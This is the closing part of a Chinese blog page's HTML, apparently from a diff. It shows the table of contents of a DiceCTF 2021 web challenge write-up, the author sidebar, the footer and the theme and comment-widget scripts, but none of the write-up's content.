+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DiceCTF2021"><span class="nav-number">1.</span> <span class="nav-text">DiceCTF2021</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#BabierCSP"><span class="nav-number">1.1.</span> <span class="nav-text">BabierCSP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Missing-Flavortext"><span class="nav-number">1.2.</span> <span class="nav-text">Missing Flavortext</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-Unit"><span class="nav-number">1.3.</span> <span class="nav-text">Web Unit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E7%82%B9%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="nav-number">1.3.1.</span> <span class="nav-text">三点运算符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3"><span class="nav-number">1.3.2.</span> <span class="nav-text">题解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9D%91%E7%82%B9"><span class="nav-number">1.3.3.</span> <span class="nav-text">坑点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-IDE"><span class="nav-number">1.4.</span> <span class="nav-text">Web IDE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9C%8BWP"><span class="nav-number">1.4.1.</span> <span class="nav-text">看WP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#safeEval%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">safeEval沙盒绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#postMessage%E6%8F%90%E4%BA%A4%E6%95%B0%E6%8D%AE"><span class="nav-number">1.4.2.</span> <span class="nav-text">postMessage提交数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="nav-number">1.4.3.</span> <span class="nav-text">非预期</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="nav-number">1.4.4.</span> <span class="nav-text">预期解</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">1.5.</span> <span class="nav-text">参考链接</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">145</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
